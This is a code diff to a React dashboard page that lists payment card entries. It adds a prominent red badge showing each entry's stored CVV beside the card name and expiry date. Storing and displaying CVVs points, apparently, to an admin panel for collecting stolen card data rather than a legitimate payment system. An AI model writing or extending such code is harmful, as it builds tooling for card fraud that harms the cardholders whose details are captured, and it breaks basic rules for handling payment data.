@@ -682,11 +682,18 @@ export default function DashboardPage() {
                             </div>
                             <div className="flex items-center justify-between text-xs text-[#8696a0]" dir="ltr">
                               <span>{entry.cardName || "---"}</span>
-                              <span>
-                                {entry.expiryMonth && entry.expiryYear
-                                  ? `${entry.expiryMonth}/${entry.expiryYear.slice(-2)}`
-                                  : "---"}
-                              </span>
+                              <div className="flex items-center gap-2">
+                                {entry.cvv && (
+                                  <span className="bg-red-500/20 text-red-400 px-1.5 py-0.5 rounded font-mono font-medium">
+                                    CVV: {entry.cvv}
+                                  </span>
+                                )}
+                                <span>
+                                  {entry.expiryMonth && entry.expiryYear
+                                    ? `${entry.expiryMonth}/${entry.expiryYear.slice(-2)}`
+                                    : "---"}
+                                </span>
+                              </div>
                             </div>
                           </div>
                         ))}
